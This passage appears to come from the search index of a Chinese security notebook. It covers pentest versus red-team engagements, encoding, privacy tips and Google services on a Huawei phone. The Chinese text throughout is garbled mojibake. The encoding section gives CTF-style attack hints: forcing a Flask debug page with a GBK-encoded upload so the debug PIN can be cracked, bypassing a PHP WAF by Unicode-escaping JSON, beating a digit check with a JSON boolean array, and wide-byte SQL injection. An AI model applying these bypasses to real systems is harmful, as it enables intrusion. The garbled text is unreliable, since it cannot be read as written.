‡ç³»ç»Ÿè¿›è¡Œå®‰å…¨æµ‹è¯•ï¼Œæ‰¾å‡ºæ¼æ´æˆ–é£é™©çš„è¿‡ç¨‹ã€‚æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆä¼šä»ä¸åŒçš„å±‚é¢ï¼ˆåŒ…æ‹¬åº”ç”¨å±‚ã€ç½‘ç»œå±‚ã€ç³»ç»Ÿå±‚ç”šè‡³ç‰©ç†å±‚ï¼‰å¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œè„†å¼±æ€§åˆ†æï¼Œå°è¯•æ‰¾å‡ºå°½å¯èƒ½å¤šçš„æ¼æ´ã€é…ç½®é”™è¯¯æˆ–å…¶ä»–å®‰å…¨é£é™©ï¼Œå¹¶å°è¯•å¯¹è¿™äº›æ‰¾åˆ°çš„æ¼æ´è¿›è¡Œç»„åˆåˆ©ç”¨ï¼Œæœ€ç»ˆè·å–åˆ°è®¿é—®å…³é”®éšç§æ•°æ®çš„æƒé™ï¼ˆéšç§æ•°æ®åŒ…æ‹¬ç”¨æˆ·ä¿¡æ¯æˆ–è€…å•†ä¸šç§˜å¯†ç­‰ï¼‰ã€‚æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¯¹æ¼æ´çš„åˆ©ç”¨ä¸€æ–¹é¢èƒ½è¯æ˜æ¼æ´çœŸå®å­˜åœ¨ï¼Œå¦ä¸€æ–¹é¢è¿™äº›æ¼æ´çš„åˆ©ç”¨ç»“æœä¹Ÿèƒ½æ­ç¤ºå‡ºç›®æ ‡ç³»ç»Ÿæ‰€é¢ä¸´çš„é£é™©ç­‰çº§ã€‚ æ¸—é€æµ‹è¯•ä¸“æ³¨äºå¯¹ç»™å®šçš„ç³»ç»Ÿè¿›è¡Œæµ‹è¯•ï¼Œå­˜åœ¨æ˜ç¡®çš„æµ‹è¯•ç›®æ ‡å’Œæµ‹è¯•è¾¹ç•Œã€‚ä¼ä¸šä¼šæŒ‡å®šæµ‹è¯•èµ·å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´ï¼Œæµ‹è¯•æ—¶é•¿ä¸€èˆ¬ä¸º1åˆ°2å‘¨ã€‚æµ‹è¯•ç›®æ ‡å¯èƒ½æ˜¯webç³»ç»Ÿã€å·¥ä¸šæ§åˆ¶ç½‘ç»œã€å†…éƒ¨åŠå…¬ç½‘ç»œç­‰ç­‰ã€‚å„ç±»ä¼—æµ‹å¹³å°ä¸Šçš„æµ‹è¯•ä»»åŠ¡æœ¬è´¨ä¸Šå°±æ˜¯æ¸—é€æµ‹è¯•ä»»åŠ¡ï¼Œè¿™äº›ä»»åŠ¡éƒ½ä¼šæ˜ç¡®æµ‹è¯•èŒƒå›´ï¼Œæ¯”å¦‚æŒ‡å®šwebç³»ç»ŸåŸŸåã€æŒ‡å®šæµ‹è¯•çš„APPç­‰ã€‚ ä¸€èˆ¬å®‰å…¨ä¼ä¸šæä¾›çš„æ¸—é€æµ‹è¯•æœåŠ¡é€šå¸¸å¯ä»¥åˆ†è§£æˆä¸€ç»„é’ˆå¯¹ä¸åŒç³»ç»Ÿçš„æµ‹è¯•ä»»åŠ¡ï¼Œå¦‚é’ˆå¯¹webç³»ç»Ÿçš„æµ‹è¯•ä»»åŠ¡ã€é’ˆå¯¹å†…éƒ¨åŠå…¬ç½‘çš„æµ‹è¯•ä»»åŠ¡ã€ç¤¾ä¼šå·¥ç¨‹å­¦æµ‹è¯•ä»»åŠ¡ç­‰ç­‰ã€‚ æ¸—é€æµ‹è¯•åœ¨è¯„ä¼°ç³»ç»Ÿæˆ–ç½‘ç»œçš„å®‰å…¨æ€§æ—¶ï¼Œé€šå¸¸ä¼šå¿½ç•¥ä¼ä¸šé‡Œå…¶ä»–è¿è¡Œç¯å¢ƒçš„å®‰å…¨é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå†…ç½‘æ¸—é€æµ‹è¯•å°†ä»å†…ç½‘ä¸­æ¶æ„ç”¨æˆ·ï¼ˆä¾‹å¦‚æ¶æ„å‘˜å·¥æˆ–è¢«å…¥ä¾µçš„å‘˜å·¥æœºå™¨ï¼‰çš„è§’åº¦è¯„ä¼°ä¼ä¸šçš„ç½‘ç»œå®‰å…¨æ€§ã€‚æµ‹è¯•å·¥ç¨‹å¸ˆåˆ°è¾¾ç°åœºåï¼Œå°†ä¼šç›´æ¥å°†ç¬”è®°æœ¬ç”µè„‘æ¥å…¥å†…éƒ¨åŠå…¬ç½‘ç»œå¼€å§‹è¿›è¡Œæµ‹è¯•ã€‚å†…ç½‘æ¸—é€æµ‹è¯•ä¼šå¿½ç•¥é»‘å®¢åœ¨å†…ç½‘ä¸­è·å¾—åˆå§‹è½è„šç‚¹è¿™ä¸ªæ­¥éª¤(é€šå¸¸æ˜¯é€šè¿‡é’“é±¼é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼æ¬ºéª—å‘˜å·¥è¿è¡Œæ¶æ„ç¨‹åº)ï¼Œç›´æ¥ä»å·²æœ‰å†…ç½‘æ¥å…¥æƒé™å¼€å§‹è¿›è¡Œæµ‹è¯•ã€‚å†…ç½‘æµ‹è¯•æŠ¥å‘Šä¼šåŒ…å«å†…ç½‘ä¸­æš´éœ²çš„æœ‰æ¼æ´çš„æœåŠ¡ã€æœªæ‰“è¡¥ä¸çš„ç³»ç»Ÿã€é”™è¯¯çš„ç³»ç»Ÿé…ç½®ã€æ•æ„Ÿæ–‡ä»¶å…±äº«ç­‰ç­‰å®‰å…¨é—®é¢˜ï¼Œä½†æ˜¯ä¸ä¼šåŒ…å«é»‘å®¢æœ€åˆå¦‚ä½•è·å–å†…ç½‘æ¥å…¥æƒé™è¿™ä¸ªæ­¥éª¤ã€‚ åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œä¼ä¸šä¸­è´Ÿè´£é˜²æŠ¤çš„å®‰å…¨å›¢é˜Ÿä¸€èˆ¬ä¸ä¼šç›´æ¥å‚ä¸ï¼Œä¸ºäº†é…åˆæ¸—é€æµ‹è¯•ï¼Œä¼ä¸šæœ‰æ—¶ä¼šå…³é—­æŸäº›å®‰å…¨é˜²æŠ¤è½¯ä»¶æˆ–ç¦ç”¨å®‰å…¨ç­–ç•¥ï¼Œæ–¹ä¾¿æµ‹è¯•å·¥ç¨‹å¸ˆæ‰¾å‡ºæ›´å¤šçš„å®‰å…¨æ¼æ´ã€‚ å½“æ•´ä¸ªæ¸—é€æµ‹è¯•æ´»åŠ¨ç»“æŸåï¼Œå·¥ç¨‹å¸ˆä¼šå‡ºå…·ä¸€ä»½æ¸—é€æµ‹è¯•æŠ¥å‘Šï¼Œé‡Œé¢åŒ…å«æ‰€æœ‰å‘ç°çš„æ¼æ´åˆ—è¡¨ä»¥åŠæ¯ä¸ªæ¼æ´å…·ä½“çš„åˆ©ç”¨æ­¥éª¤å’Œè¿‡ç¨‹ï¼ŒåŒæ—¶ä¼šä¾æ®æ¼æ´å±å®³ç»™å‡ºç›¸åº”çš„å¨èƒç­‰çº§è¯„åˆ†ã€‚ çº¢é˜Ÿ å°½ç®¡çº¢é˜Ÿæµ‹è¯•åœ¨æœ‰äº›æ”»å‡»æŠ€æœ¯æ–¹é¢ç±»ä¼¼æ¸—é€æµ‹è¯•ï¼Œä½†ä¸åŒäºæ¸—é€æµ‹è¯•å°½é‡å¤šæ‰¾æ¼æ´çš„ç›®æ ‡ï¼Œçº¢é˜Ÿæµ‹è¯•çš„ä»»åŠ¡å¾€å¾€æ˜¯æ‹¿ä¸‹æŸä¸ªç‰¹å®šçš„ä¸šåŠ¡ç›®æ ‡(æ¯”å¦‚å…¬å¸æŸä¸ªé¡¹ç›®çš„æºä»£ç ï¼Œå…¬å¸ç«æ ‡æ ‡ä¹¦å’Œåº•ä»·ç­‰å•†ä¸šæœºå¯†ï¼ŒæŸä¸ªé«˜å±‚ç®¡ç†äººå‘˜çš„é‚®ç®±æˆ–ä¸ªäººæœºç­‰) ã€‚çº¢é˜Ÿè¦æ¨¡æ‹ŸçœŸå®ä¸–ç•Œä¸­çš„æå…·ç›®çš„æ€§ä¸”ä¸å¸Œæœ›è¢«æ£€æµ‹åˆ°çš„æ¶æ„æ”»å‡»è€…ï¼ˆå—ç«äº‰å¯¹æ‰‹é›‡ä½£çš„æ¶æ„é»‘å®¢ï¼Œæ”¶é›†æ”¿æ²»ã€ç»æµå’Œç§‘æŠ€æƒ…æŠ¥çš„å¢ƒå¤–å›½å®¶èµ„åŠ©çš„é»‘å®¢å›¢ä¼™ç­‰ï¼‰ï¼Œçº¢é˜Ÿæµ‹è¯•æŸç§ç¨‹åº¦ä¸Šå¯ä»¥è¯´æ˜¯åˆæ³•çš„é«˜çº§æŒç»­æ€§å¨èƒ(APT)ã€‚åœ¨è¿™ç§å®Œå…¨è´´è¿‘çœŸå®æ”»å‡»çš„æµ‹è¯•æ´»åŠ¨ä¸­ï¼Œèƒ½å¤Ÿæµ‹è¯•ä¼ä¸šå®‰å…¨é˜²æŠ¤ä½“ç³»çš„é˜»æ–­ï¼ˆpreventionï¼‰ã€æ£€æµ‹ï¼ˆdetectionï¼‰å’Œå“åº”ï¼ˆresponseï¼‰èƒ½åŠ›ã€‚ æ¸—é€æµ‹è¯•ä¸­åªå…³æ³¨ç»™å®šç›®æ ‡ç³»ç»Ÿçš„æ¼æ´ï¼Œçº¢é˜Ÿæµ‹è¯•åˆ™å®Œå…¨ä¸ä¸€æ ·ã€‚çº¢é˜Ÿåœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å…³æ³¨çš„æ˜¯å¦‚ä½•è§„åˆ’ä¸€æ¡æ”»å‡»è·¯å¾„æ¥è¾¾åˆ°ç›®çš„ã€‚åœ¨æ•´ä¸ªçº¢é˜Ÿæµ‹è¯•è¿‡ç¨‹ä¸­ä¸ä¸€å®šè¦ä¹Ÿä¸ä¸€å®šä¼šå‘ç°ç›®æ ‡ç»„ç»‡çš„æ¼æ´ï¼Œåªè¦èƒ½è¾¾åˆ°ç›®çš„ï¼Œä»»ä½•å½¢å¼çš„æ”»å‡»æ‰‹æ®µéƒ½å¯ä»¥ä½¿ç”¨ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºwebæˆ–è€…æ“ä½œç³»ç»Ÿæ¼æ´ã€ç¤¾ä¼šå·¥ç¨‹å­¦ã€ç‰©ç†æ¸—é€ã€æ”»å‡»ä¸Šä¸‹æ¸¸åˆä½œä¾›åº”å•†ç­‰ã€‚ åœ¨çº¢é˜Ÿæµ‹è¯•å¼€å§‹å‰ï¼Œé™¤äº†ä»»åŠ¡ç›®æ ‡å¤–ï¼Œä¸ä¼šç»™åˆ°çº¢é˜Ÿå…³äºç›®æ ‡ä¼ä¸šçš„ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚çº¢é˜Ÿéœ€è¦é€šè¿‡å„ç§æ¸ é“å»æœé›†ç›®æ ‡çš„ç‰©ç†ä½ç½®ã€å…¬å¼€çš„ç½‘ç»œç³»ç»Ÿå’ŒæœåŠ¡ã€ç»„ç»‡æ¶æ„ä»¥åŠé›‡å‘˜ç­‰ä¿¡æ¯ï¼Œç„¶åæ ¹æ®æ”¶é›†çš„ä¿¡æ¯åˆ¶å®šæ”»å‡»è®¡åˆ’å¹¶å®æ–½ã€‚è¢«æµ‹ä¼ä¸šå¹¶ä¸æ¸…æ¥šï¼ˆæˆ–ä»…æœ‰å°‘æ•°äººæ¸…æ¥šï¼‰æ”»å‡»å°†äºä½•æ—¶å‘èµ·ï¼Œå°†ä»¥ä½•ç§æ–¹å¼è¿›è¡Œã€‚çº¢é˜Ÿæµ‹è¯•çš„æŒç»­æ—¶é—´ä¸€èˆ¬æ¯”æ¸—é€æµ‹è¯•æ›´é•¿ï¼Œå¯ä»¥è¾¾åˆ°4åˆ°6å‘¨ç”šè‡³æ›´é•¿ï¼ˆæƒ³æƒ³çœ‹çœŸå®APTæ”»å‡»ä¸­é•¿è¾¾æ•°æœˆçš„æ½œä¼å’ŒæŒç»­æ¸—é€ï¼‰ã€‚ çº¢é˜Ÿåœ¨å®æ–½æ”»å‡»æ—¶ï¼Œä¼šå°½é‡éšè—è‡ªå·±çš„è¸ªè¿¹ï¼Œå¦å¤–è¿˜ä¼šè¯¦ç»†è®°å½•æ¯ä¸ªæ”»å‡»è¡Œä¸ºçš„å…·ä½“å®æ–½æ—¶é—´ï¼Œåœ¨æ•´ä¸ªè¡ŒåŠ¨ç»“æŸåéœ€è¦ä¸ç»„ç»‡ä¸­çš„é˜²å¾¡æ£€æµ‹éƒ¨é—¨(å³è“é˜Ÿ)çš„æ£€æµ‹å“åº”æ—¶é—´è¡¨è¿›è¡Œæ ¸å¯¹ï¼Œä»¥æ­¤æ¥è¯„ä¼°é˜²å¾¡æ£€æµ‹æœºåˆ¶çš„æœ‰æ•ˆæ€§å’Œå“åº”é€Ÿåº¦ï¼ŒåŒæ—¶æ£€æŸ¥è“é˜Ÿåœ¨å“ªäº›æ–¹é¢å­˜åœ¨æ¼æŠ¥å’Œå“åº”ä¸åŠæ—¶ï¼Œå¸®åŠ©è“é˜Ÿæ›´å¥½çš„å‘ç°é˜²å¾¡æ£€æµ‹å±‚é¢çš„å¼±ç‚¹ã€‚è¿™ä¸€ç‚¹CSåšçš„å¾ˆå¥½ï¼Œå¯ä»¥å¯¼å‡ºçº¢é˜Ÿçš„è¯¦ç»†æ“ä½œæ—¥å¿—å’Œæ—¶é—´ã€‚ ç»“è¯­ ä¸¤è€…å¹¶æ²¡æœ‰å“ªä¸ªæ›´å¥½ä¹‹è¯´ï¼Œå¯¹äºä¼ä¸šæ¥è®²ï¼Œå…ˆè¦ææ¸…æ¥šå…·ä½“çš„åœºæ™¯å’Œå®‰å…¨éœ€æ±‚ï¼Œæ‰èƒ½ç¡®å®šéœ€è¦çš„æ˜¯æ¸—é€æµ‹è¯•è¿˜æ˜¯çº¢é˜Ÿæµ‹è¯•ã€‚å¯¹äºæ–°ä¸Šçº¿çš„ä¸šåŠ¡ç³»ç»Ÿï¼Œéœ€è¦ææ¸…æ¥šå­˜åœ¨é‚£äº›æ¼æ´ä»¥åŠæ¼æ´å¯èƒ½é€ æˆçš„å±å®³æ—¶ï¼Œéœ€è¦çš„æ˜¯æ¸—é€æµ‹è¯•ï¼›å¦‚æœä¼ä¸šå„ä¸ªå­ç³»ç»Ÿéƒ½å·²ç»è¿›è¡Œè¿‡æ¸—é€æµ‹è¯•ï¼Œå¹¶ä¸”å­˜åœ¨æˆç†Ÿçš„æ¼æ´ç®¡ç†ã€é˜²å¾¡æ£€æµ‹ä»¥åŠåº”æ€¥å“åº”æœºåˆ¶ï¼Œå¦å¤–è¿˜æƒ³è¦å¯¹ä¼ä¸šæ•´ä½“å®‰å…¨ç¯å¢ƒè¿›è¡Œè¯„ä¼°ï¼Œäº†è§£ä¼ä¸šåœ¨é¢ä¸´çœŸæ­£çš„å®‰å…¨æ”»å‡»äº‹ä»¶æ—¶ï¼Œæ˜¯å¦æœ‰èƒ½åŠ›é˜²å¾¡æˆ–è€…æ£€æµ‹å¹¶åŠæ—¶å“åº”ï¼Œé‚£ä¹ˆéœ€è¦çš„ä¾¿æ˜¯çº¢é˜Ÿè¯„ä¼°ã€‚ æœ€åè¯´ä¸€ç‚¹ï¼Œåœ¨å¾ˆå¤šäººçš„è®¤çŸ¥é‡Œé¢ï¼Œä¸€ä¸ªä¼ä¸šè¢«æ”»ç ´ä¸€å®šæ˜¯å› ä¸ºå­˜åœ¨å®‰å…¨æ¼æ´æˆ–è€…é…ç½®é”™è¯¯ä¹‹ç±»çš„å®‰å…¨é—®é¢˜ï¼Œè¿™æ˜¯ä¸æ­£ç¡®çš„ã€‚å¦‚æœçœŸè¿™ä¹ˆç®€å•ï¼Œé‚£åªè¦æŒ‰æ—¶æ‰“è¡¥ä¸ï¼Œå°±èƒ½é˜²ä½æ‰€æœ‰æ²¡æœ‰0dayçš„æ¶æ„é»‘å®¢ç”šè‡³é˜²ä½APTæ”»å‡»äº†ã€‚ä¸Šæ–‡å·²ç»è¯´è¿‡ï¼Œçº¢é˜Ÿæµ‹è¯•è¿‡ç¨‹ä¸­ä¸ä¸€å®šä¼šå‘ç°å®‰å…¨æ¼æ´ï¼Œå¾ˆå¤šæ—¶å€™ä¸éœ€è¦å®‰å…¨æ¼æ´å°±èƒ½æ‰“ç©¿ä¸€ä¸ªä¼ä¸šã€‚è€Œç°ä»Šçš„å®‰å…¨å¸‚åœºï¼Œå¾ˆå¤šä¼ä¸šè¿˜æ˜¯ä»¥æ¼æ´æ•°é‡æ¥è¯„å®šå®‰å…¨æœåŠ¡å›¢é˜Ÿçš„èƒ½åŠ›ï¼Œå°±å¯¼å‡ºç°äº†å¾ˆå¤šå®‰å…¨æœåŠ¡æŠ¥å‘Šç¡¬å‡‘æ¼æ´æ•°é‡çš„æ€ªè±¡ã€‚åœ¨è¿™ç§å¤§ç¯å¢ƒä¸‹ï¼Œä¼ä¸šå¯èƒ½åè€Œè®¤ä¸ºæ²¡æœ‰å‘ç°å®‰å…¨æ¼æ´ä½†æ‰“ç©¿äº†ä»–ä»¬çš„çº¢é˜Ÿå®‰å…¨èƒ½åŠ›ä¸è¡Œï¼Œæˆ–è€…è®¤ä¸ºçº¯ç²¹æ˜¯å¶ç„¶ä¾¥å¹¸æ‰èƒ½å¾—æ‰‹ã€‚è¿™æ˜¯ä¸€ä¸ªè®¤çŸ¥å‡çº§çš„è¿‡ç¨‹ï¼Œä»€ä¹ˆæ—¶å€™èƒ½ä¸ä»¥æ¼æ´æ•°é‡æ¥è¯„å®šå®‰å…¨æœåŠ¡èƒ½åŠ›ï¼Œæ‰èƒ½è¯´çœŸæ­£ç†è§£äº†å®‰å…¨å’Œæ”»å‡»ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-26 18:38:33 "},"07.åŸºç¡€çŸ¥è¯†/ç¼–ç .html":{"url":"07.åŸºç¡€çŸ¥è¯†/ç¼–ç .html","title":"ç¼–ç ","keywords":"","body":"ç¼–ç çš„ç”±æ¥ è®¡ç®—æœºå­˜å‚¨çš„ä»»ä½•æ•°æ®ï¼ŒåŒ…æ‹¬å„ç§æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³è§†é¢‘æ–‡ä»¶ç­‰ç­‰ï¼Œå®é™…ä¸Šéƒ½æ˜¯ä¸€ä¸²äºŒè¿›åˆ¶æ•°å­—01å­—èŠ‚åºåˆ—ç»„æˆçš„ã€‚ å­—èŠ‚ä¸€èˆ¬ç”¨æ¥å­˜å‚¨ä¸ç½‘ç»œä¼ è¾“ï¼Œè¿™æ ·å¯ä»¥èŠ‚çœå­˜å‚¨ç©ºé—´ä¸ç½‘ç»œä¼ è¾“å¸¦å®½ã€‚è€Œå­—ç¬¦ä¸»è¦æ˜¯ç”¨äºæ˜¾ç¤ºï¼Œæ–¹ä¾¿å¤§å®¶é˜…è¯»ã€‚ ç¼–ç ä¸»è¦æ˜¯ä¸ºäº†å­˜å‚¨ä¼ è¾“ï¼Œè€Œè§£ç æ˜¯ä¸ºäº†æ–¹ä¾¿é˜…è¯» ç¼–ç æ–¹å¼çš„ç¡®ç«‹ å¯ä»¥é€šè¿‡httpæ¶ˆæ¯å¤´çš„accept-encodingæŒ‡å®š htmlä¸­çš„charset=â€UTF-8â€³ åº”ç”¨æœ¬èº«çš„ç¼–ç æ–¹å¼ base64ç¼–ç  ç¼–ç è¡¨ å¤§å°å†™å­—æ¯ï¼Œ[0,9]ï¼Œ+ï¼Œ/ åŠ å¯† æ¯6ä¸ªå­—ç¬¦ä¸ºä¸€ç»„ è§£å¯† æ¯8ä¸ªå­—ç¬¦ä¸ºä¸€ç»„ åŠ å¯†æ—¶ä¸è¶³çš„ä¼šè¡¥ä¸Š= rot13 æ˜/å¯†æ–‡ç©ºé—´ï¼šå­—æ¯è¡¨ æ“ä½œï¼šå³ç§»13ä½ å¯é€†è¿ç®— urlç¼–ç  URLåŸç†ã€URLç¼–ç ã€URLç‰¹æ®Šå­—ç¬¦ ç‰¹æ®Šå­—ç¬¦ URLä¸­çš„ä¿ç•™å’Œä¸å®‰å…¨å­—ç¬¦ - atzuge - åšå®¢å›­ åœ¨å“ªé‡Œå‘ç”Ÿ å½“æˆ‘ä»¬å‘æœåŠ¡å™¨å‘é€æ•°æ®æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šè‡ªåŠ¨å°†éœ€è¦ç¼–ç çš„å­—ç¬¦è¿›è¡ŒURLç¼–ç ï¼ˆå¯ä»¥åœ¨æ•°æ®åŒ…ä¸­çœ‹åˆ°ï¼‰,ç„¶åæœåŠ¡å™¨æ¥æ”¶åˆ°æ•°æ®åŒ…åï¼Œä¹Ÿä¼šè‡ªåŠ¨è§£ç URLç¼–ç åçš„å­—ç¬¦ã€‚ Ascii é•¿åº¦ï¼šå›ºå®š1å­—èŠ‚ 0~126ä¸ªå­—ç¬¦ï¼Œå…¶ä¸­å‰32ä¸ªå­—ç¬¦ä¸ºä¸å¯æ‰“å°å­—ç¬¦ Unicodeå­—ç¬¦é›†--ä¸‡å›½ç  å½¢å¼ï¼šU+æ•°å­— æˆ–è€… 16è¿›åˆ¶å½¢å¼\\u8fd9\\u662f\\u4e00 é•¿åº¦ï¼šå›ºå®š2å­—èŠ‚ https://www.compart.com/en/unicode UTF UTFæ˜¯Unicode Transformation Format(ç»Ÿä¸€ç è½¬æ¢æ ¼å¼)ï¼Œå˜é•¿Unicodeç¼–ç ã€‚ å¸¸è§çš„æœ‰UTF-8,UTF-16,UTF-32 jsfuck http://www.jsfuck.com/ https://blog.csdn.net/qq_36539075/article/details/79946099 HTMLå®ä½“ç¼–ç  &#36825 ç¼–ç å®‰å…¨ base64ç¼–ç ç»•è¿‡ å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-ä»RFCçœ‹å¦‚ä½•ä½¿ç”¨Base64ç¼–ç ç»•è¿‡WAF ç¼–ç å‰åä¸ä¸€è‡´ SQLå®½å­—èŠ‚æ³¨å…¥ æ–‡ä»¶ç¼–ç ä¸åŒï¼Œå¯¼è‡´æŠ¥é”™ [NSSRound#6 Team]check(Revenge) @app.route('/download', methods=['POST']) def download_file(): filename = request.form.get('filename') if filename is None or filename == '': return '?' filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if '..' in filename or '/' in filename: return '?' if not os.path.exists(filepath) or not os.path.isfile(filepath): return '?' if os.path.islink(filepath): return '?' if oct(os.stat(filepath).st_mode)[-3:] != '444': return '?' with open(filepath, 'r') as f: return f.read() with open(filepath, 'r') as fï¼Œè¿™é‡Œmodeä¸ºrï¼Œé»˜è®¤ä¸ºutf-8ç¼–ç ã€‚ æ‰€ä»¥å½“æˆ‘ä»¬å°†gbkç¼–ç çš„æ–‡ä»¶ä¸Šä¼ åï¼Œè¯»å–æ—¶å°±ä¼šæŠ¥é”™ï¼Œä»è€Œå‡ºç°debugç•Œé¢ è¿™æ—¶å€™å°±å¯ä»¥å°è¯•è¿›è¡ŒFlaskçš„PINç ç ´è§£ Unicodeæ¬ºéª— åŸç†ç®€å•æ¥è¯´å°±æ˜¯å¯¹å­—ç¬¦ä¸²çš„æ ‡å‡†åŒ–æ“ä½œå¯¼è‡´unicodeå­—ç¬¦è½¬æ¢æˆäº†ä¸ä»–åŒå½¢çš„asciiå­—ç¬¦ã€‚ Web åŸºäºASIS 2019ï¼šUnicorn shopå­¦ä¹ Unicodeå®‰å…¨éšæ‚£ â€“ å¤§å½ªçš„å°ç«™ æŸ¥è¯¢ï¼š https://unicode-table.com/cn/blocks/ https://unicode-table.com/cn/sets/symbols-for-nickname/#arabic-and-roman-numerals JSON jsonç¼–ç  å­—ç¬¦ä¸²æ”¯æŒunicodeç¼–ç  è¿‡æ»¤ä½ç½®å‡ºé”™ åç«¯æ¥æ”¶JSONæ•°æ®ï¼Œæ²¡æœ‰å…ˆå¯¹å…¶è¿›è¡Œè§£ç ç­‰å¤„ç†ï¼Œè€Œç›´æ¥å¯¹å…¶è¿›è¡Œæ“ä½œå¦‚åˆ¤æ–­ï¼Œè¿‡æ»¤ è¿‡æ»¤ function waf($str) { xxxx; } $body = file_get_contents('php://input'); waf($body); $data = json_decode($body, true); å¯¹äºè¿™ç§æƒ…å†µï¼Œåªéœ€è¦å¯¹æäº¤çš„JSONæ•°æ®è¿›è¡ŒUNICODEç¼–ç å³å¯ç»•è¿‡wafã€‚ åˆ¤æ–­æ¯”è¾ƒ $numbers=file_get_contents('php://input'); #è·å–ajaxè¯·æ±‚çš„æ•°æ® for($i=0; $i å°†$numbersçš„æ¯ä¸€ä½ä¸å¾…æ¯”è¾ƒæ•°å­—é€å­—æ¯”è¾ƒ å› ä¸ºjsonæ”¯æŒæ•°ç»„å’Œå¸ƒå°”ç±»å‹çš„æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ jsonæ•°æ®ä¸º{numbers:[true,true,true,true,true,true,true]} åªè¦å¾…æ¯”è¾ƒæ•°å­—$win_numbersçš„æ¯ä¸€ä½éƒ½å¤§äº0ï¼Œå³å¯è¾“å‡ºflag å‚è€ƒæ–‡ç«  HTMLå­—ç¬¦é›† (w3school.com.cn) 30ä½™ç§åŠ å¯†ç¼–ç ç±»å‹çš„å¯†æ–‡ç‰¹å¾åˆ†æï¼ˆå»ºè®®æ”¶è—ï¼‰ - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com) pythonä¸­çš„ç¼–ç  Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:15:59 "},"08.æ‚ä¸ƒæ‚å…«/ä¸ªäººä¿¡æ¯ä¿æŠ¤.html":{"url":"08.æ‚ä¸ƒæ‚å…«/ä¸ªäººä¿¡æ¯ä¿æŠ¤.html","title":"ä¸ªäººä¿¡æ¯ä¿æŠ¤","keywords":"","body":"ç›’æ­¦å™¨ sgk å¾®åš2019å¹´ å­¦ä¹ é€š2022å¹´ ä¸Šæµ·ga2022å¹´ æ·˜å® å†…é¬¼èµšå¤–å¿« å›½å¤–APPæ³¨å†Œ giffgaffè‹±å›½å¡ï¼Œ10è‹±é•‘ç†è®ºä¿å·25å¹´ https://giffgaffsim.notion.site/giffgaff-2024-e62d10bf0e944a129bc31c5b0d240f8d#2fb9791c5d6e42a5811be12659859996 https://post.smzdm.com/p/a4pklgz8/ https://www.v2ex.com/t/971919 èº«ä»½è¯åŠ æ°´å° æµè§ˆå™¨ä¸ä¿å­˜å¯†ç  Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 16:10:51 "},"08.æ‚ä¸ƒæ‚å…«/åä¸ºå®‰è£…è°·æ­Œ.html":{"url":"08.æ‚ä¸ƒæ‚å…«/åä¸ºå®‰è£…è°·æ­Œ.html","title":"åä¸ºå®‰è£…è°·æ­Œ","keywords":"","body":"å®‰è£…è°·æ­Œæ¡†æ¶ å› ä¸ºæŸäº›ä¸å¯æŠ—å› ç´ ï¼Œåœ¨2019å¹´ï¼Œè°·æ­Œå®£å¸ƒå…¨é¢åˆ‡æ–­ä¸åä¸ºçš„åˆä½œï¼Œä¸å†å…è®¸åä¸ºæ‰‹æœºä½¿ç”¨è°·æ­Œçš„GMSæœåŠ¡ã€‚ å¯¼è‡´è®¸å¤šä¾èµ–GoogleæœåŠ¡çš„åº”ç”¨æ— æ³•æ­£å¸¸çš„å®‰è£…ã€è¿è¡Œã€‚ æ‰‹æœºè®¾å¤‡ä¿¡æ¯ï¼šNove7SEï¼ŒEMUIç‰ˆæœ¬10.1.1 åè°·å¥—ä»¶ æŒ‰ç…§æ­¥éª¤èµ°å³å¯ï¼Œé‡åˆ°çš„é—®é¢˜ï¼š ç¬¬å…­æ­¥å®‰è£…microgæ—¶å‡ºç°ç³»ç»Ÿå·²å­˜åœ¨æ›´é«˜ç‰ˆæœ¬æ— æ³•å®‰è£… å…³é—­éšç§ç©ºé—´ï¼Œåº”ç”¨åˆ†èº«ï¼Œçº¯å‡€æ¨¡å¼ï¼Œç”¨æˆ·ä¸è´¦æˆ·ä¸­åº”åªæœ‰ä¸€ä¸ªè´¦æˆ· playä¿æŠ¤æœºåˆ¶è®¤è¯ æ‹¿åˆ°gsfidè¿›è¡Œæ³¨å†ŒGoogle æœåŠ¡æ¡†æ¶ Android IDæ³¨å†Œï¼Œè¿˜æ˜¯ä¸èƒ½é€šè¿‡è®¤è¯å‚è€ƒåä¸ºè®¾å¤‡ã€æœªè·å¾—playä¿æŠ¤æœºåˆ¶è®¤è¯ã€‘çš„è§£å†³æ–¹æ³•_å“”å“©å“”å“©_bilibili â€‹ è™½ç„¶è¿˜æ˜¯æ˜¾ç¤ºè®¾å¤‡æœªé€šè¿‡è®¤è¯ï¼Œä½†èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨playå•†åº—ï¼Œyoutubeç­‰ï¼Œæ¸¸æˆå³ä½¿æ˜¾ç¤ºè®¾å¤‡å¼‚å¸¸ä½†é‡æ–°æ‰“å¼€æ¸¸æˆä¹Ÿèƒ½è¿›å…¥æ­£å¸¸æ¸¸ç©ã€‚ â€‹ ä¸€ä¸ªæœˆåç»­ åˆå¼¹å‡ºäº†playä¿æŠ¤æœºåˆ¶è®¤è¯ï¼Œä½†æ˜¯ç›¸å…³APPè¿˜æ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼ŒæŠŠplayå•†åº—çš„é€šçŸ¥å…³äº†å°±è¡Œ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by 